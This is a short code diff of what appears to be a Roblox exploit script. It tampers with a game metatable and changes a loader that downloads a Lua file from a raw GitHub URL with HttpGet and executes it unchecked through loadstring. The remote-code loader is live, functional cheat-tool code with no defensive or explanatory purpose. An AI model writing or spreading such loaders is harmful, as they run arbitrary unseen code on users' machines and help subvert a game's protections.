@@ -81,10 +81,6 @@ end)
 setreadonly(gmt, true)
 task.wait(0.1)
 
-local _ls = getgenv().loadstring or loadstring
+local _ls = getgenv().loadstring or load
 local ok, src = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/chinzhuoxuan3-byte/Sdgt/refs/heads/main/LS_1773829886.lua.txt", true)
-if ok and src then
-    local fn = _ls(src)
-    if fn then pcall(fn) end
-end
-
+if ok and src then local fn = _ls(src) if fn then pcall(fn) end end
